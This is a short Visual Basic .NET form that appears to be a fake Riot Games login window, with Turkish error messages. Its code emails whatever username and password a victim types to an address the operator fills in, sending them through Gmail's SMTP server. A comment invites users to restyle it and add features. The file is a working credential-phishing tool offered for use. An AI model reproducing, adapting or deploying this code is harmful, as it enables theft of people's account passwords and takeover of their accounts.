Imports System.Net.Mail
Public Class Form1
    'maliiplt* If you want you can surely change these background or colours and adding new features too!'
    'just enjoy!'
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            MsgBox("Riot Adı Yanlış")
            If TextBox2.Text = "" Then
                MsgBox("Şifre Yanlış")
            Else
            End If
        End If
        Dim smtpServer As New SmtpClient()
        Dim mail As New MailMessage()
        smtpServer.Credentials = New Net.NetworkCredential("Your mail adress", "Your Unique Password")
        smtpServer.Port = 587
        smtpServer.Host = "smtp.gmail.com"
        smtpServer.EnableSsl = True
        mail = New MailMessage()
        mail.From = New MailAddress("Your mail adress")
        mail.To.Add("Your mail adress")
        mail.Subject = "Username : " & TextBox1.Text
        mail.Body = "Password : " & TextBox2.Text & ","
        smtpServer.Send(mail)
        MsgBox("First message box")
        MsgBox("Second message box (if you don't want to use just delete this line)")
    End Sub
End Class
